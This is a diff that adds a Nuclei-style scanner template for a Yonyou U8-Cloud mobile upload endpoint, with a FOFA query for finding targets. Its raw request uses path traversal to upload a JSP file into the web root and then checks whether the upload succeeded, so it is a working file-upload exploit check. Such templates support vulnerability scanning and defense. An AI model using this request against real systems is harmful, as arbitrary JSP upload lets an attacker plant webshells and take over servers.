@@ -1,0 +1,37 @@
+id: mobile_upload_file
+info:
+  name: 用友移动系统download_upload_file
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+requests:
+  - raw:
+      - |
+        POST /mobsm/common/upload?category=../webapps/nc_web/maupload/apk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Content-Length: 177
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        SL-CE-SUID: 15
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="c0fig.jsp"
+
+        <% out.println("123");%>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c0fig.jsp
+      - type: word
+        part: header
+        words:
+          - '200'
